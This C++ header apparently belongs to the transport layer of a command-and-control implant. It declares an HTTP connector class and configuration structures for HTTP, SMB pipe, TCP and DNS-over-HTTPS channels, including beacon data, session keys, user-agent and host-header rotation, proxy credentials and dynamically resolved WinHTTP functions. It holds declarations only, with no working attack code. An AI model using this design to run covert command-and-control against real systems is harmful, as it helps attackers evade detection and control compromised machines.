#pragma once

#include <windows.h>
#include <winhttp.h>
#include "Connector.h"

/* MinGW winhttp.h may omit flags named like WinInet; values match Windows SDK. */
#ifndef SECURITY_FLAG_IGNORE_REVOCATION
#define SECURITY_FLAG_IGNORE_REVOCATION 0x00000080u
#endif

#ifndef PROFILE_STRUCT
#define PROFILE_STRUCT

#define PROXY_TYPE_NONE     0
#define PROXY_TYPE_HTTP     1
#define PROXY_TYPE_HTTPS    2

typedef struct {
	ULONG  servers_count;
	BYTE** servers;
	WORD*  ports;
	BOOL   use_ssl;
	BYTE*  http_method;
	ULONG  uri_count;
	BYTE** uris;
	BYTE*  parameter;
	ULONG  ua_count;
	BYTE** user_agents;
	BYTE*  http_headers;
	ULONG  ans_pre_size;
	ULONG  ans_size;
	ULONG  hh_count;
	BYTE** host_headers;
	BYTE   rotation_mode;   // 0=sequential, 1=random
	BYTE   proxy_type;      // 0=none, 1=http, 2=https
	BYTE*  proxy_host;
	WORD   proxy_port;
	BYTE*  proxy_username;
	BYTE*  proxy_password;
} ProfileHTTP;

typedef struct {
	BYTE* pipename;
} ProfileSMB;

typedef struct {
	BYTE* prepend;
	WORD  port;
} ProfileTCP;

#define DNS_MODE_UDP           0
#define DNS_MODE_DOH           1
#define DNS_MODE_UDP_FALLBACK  2
#define DNS_MODE_DOH_FALLBACK  3

typedef struct {
	BYTE* domain;
	BYTE* resolvers;
	BYTE* doh_resolvers;
	BYTE* qtype;
	ULONG pkt_size;
	ULONG label_size;
	ULONG ttl;
	BYTE* encrypt_key;
	ULONG burst_enabled;
	ULONG burst_sleep;
	ULONG burst_jitter;
	ULONG dns_mode;
	BYTE* user_agent;
} ProfileDNS;
#endif

#define DECL_API(x) decltype(x) * x

struct HTTPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);

	DECL_API(WinHttpOpen);
	DECL_API(WinHttpCloseHandle);
	DECL_API(WinHttpConnect);
	DECL_API(WinHttpOpenRequest);
	DECL_API(WinHttpSendRequest);
	DECL_API(WinHttpReceiveResponse);
	DECL_API(WinHttpQueryHeaders);
	DECL_API(WinHttpReadData);
	DECL_API(WinHttpSetOption);
	DECL_API(WinHttpAddRequestHeaders);
	DECL_API(WinHttpWriteData);
};

class ConnectorHTTP : public Connector
{
	ULONG  ua_count       = 0;
	CHAR** user_agents    = NULL;
	ULONG  ua_index       = 0;
	ULONG  hh_count       = 0;
	CHAR** host_headers   = NULL;
	ULONG  hh_index       = 0;
	BOOL   ssl            = FALSE;
	CHAR*  http_method    = NULL;
	ULONG  server_count   = 0;
	CHAR** server_address = NULL;
	WORD*  server_ports   = 0;
	ULONG  uri_count      = 0;
	CHAR** uris           = NULL;
	ULONG  uri_index      = 0;
	CHAR*  headers        = NULL;
	ULONG  ans_size       = 0;
	ULONG  ans_pre_size   = 0;
	BYTE   rotation_mode  = 0;

	BYTE* recvData = NULL;
	int   recvSize = 0;

	BYTE  proxy_type     = PROXY_TYPE_NONE;
	CHAR* proxy_url      = NULL;
	CHAR* proxy_username = NULL;
	CHAR* proxy_password = NULL;

	HTTPFUNC* functions = NULL;

	HINTERNET hInternet = NULL;
	HINTERNET hConnect  = NULL;

	ULONG server_index = 0;

public:
	ConnectorHTTP();

	BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
	void CloseConnector() override;

	BYTE* RecvData() override;
	int   RecvSize() override;
	void  RecvClear() override;

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;

private:
	void SendData(BYTE* data, ULONG data_size);
};
